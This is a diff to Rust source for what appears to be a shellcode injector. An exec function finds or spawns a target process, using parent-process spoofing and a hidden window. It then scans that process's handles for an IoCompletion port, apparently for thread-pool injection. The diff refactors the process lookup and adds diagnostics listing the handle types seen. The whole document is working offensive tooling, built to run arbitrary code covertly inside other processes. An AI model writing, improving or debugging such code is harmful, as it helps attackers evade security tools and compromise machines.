@@ -18,15 +18,14 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     let target_program_hash = crate::utils::dbj2_hash(target_program.to_lowercase().as_bytes());
     let pid = crate::syscall::common::get_process_id_by_name(target_program_hash);
 
-    let process_id = if let Some(existing_pid) = pid {
-        existing_pid
-    } else {
-        let process_info = crate::ntapi::create_process_with_spoofing(target_program.as_str(), true)?;
-        
-        // Resume immediately with SW_HIDE
-        crate::ntapi::resume_thread(process_info.hThread)?;
-        
-        process_info.dwProcessId
+    let process_id = match pid {
+        Ok(existing_pid) => existing_pid,
+        Err(_) => {
+            let process_info = crate::ntapi::create_process_with_spoofing(target_program.as_str(), true)?;
+            // Resume immediately with SW_HIDE
+            crate::ntapi::resume_thread(process_info.hThread)?;
+            process_info.dwProcessId
+        }
     };
 
     let shellcode = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
@@ -114,10 +113,16 @@ fn find_target_io_completion_port(pid: u32, process_handle: isize) -> Result<isi
 
     let current_process_handle = -1isize; // NtCurrentProcess
 
+    use std::collections::HashMap;
+
+    let mut scanned = 0usize;
+    let mut type_counts: HashMap<String, u32> = HashMap::new();
+
     for i in 0..count {
         let entry = unsafe { &*handles_ptr.add(i) };
         
         if entry.unique_process_id as u32 == pid {
+            scanned += 1;
             let mut dup_handle: isize = 0;
             let status = duplicate_object(
                 process_handle,
@@ -131,7 +136,24 @@ fn find_target_io_completion_port(pid: u32, process_handle: isize) -> Result<isi
 
             if status.is_ok() && status.unwrap() >= 0 {
                 // Check object type
-                if is_io_completion_handle(dup_handle) {
+                // Try to query the object type name for diagnostics
+                let mut name = "<unknown>".to_string();
+                let mut buf: Vec<u8> = vec![0; 1024];
+                let mut retlen = 0;
+                if let Ok(st) = query_object(dup_handle, 2, buf.as_mut_ptr() as *mut c_void, buf.len() as u32, &mut retlen) {
+                    if st >= 0 {
+                        let type_info = unsafe { &*(buf.as_ptr() as *const OBJECT_TYPE_INFORMATION) };
+                        let name_len = type_info.type_name.length as usize;
+                        if name_len > 0 {
+                            let name_slice = unsafe { std::slice::from_raw_parts(type_info.type_name.buffer, name_len / 2) };
+                            name = String::from_utf16_lossy(name_slice);
+                        }
+                    }
+                }
+
+                *type_counts.entry(name.clone()).or_insert(0) += 1;
+
+                if name == "IoCompletion" {
                     return Ok(dup_handle);
                 }
                 close_handle(dup_handle);
@@ -139,7 +161,13 @@ fn find_target_io_completion_port(pid: u32, process_handle: isize) -> Result<isi
         }
     }
 
-    Err("Target IO Completion Port not found".to_string())
+    // Build diagnostic message
+    let mut details = String::new();
+    for (k, v) in type_counts.iter() {
+        details.push_str(&format!("{}: {}, ", k, v));
+    }
+
+    Err(format!("Target IO Completion Port not found (scanned {} handles for pid {}). Types seen: {}", scanned, pid, details))
 }
 
 fn is_io_completion_handle(handle: isize) -> bool {
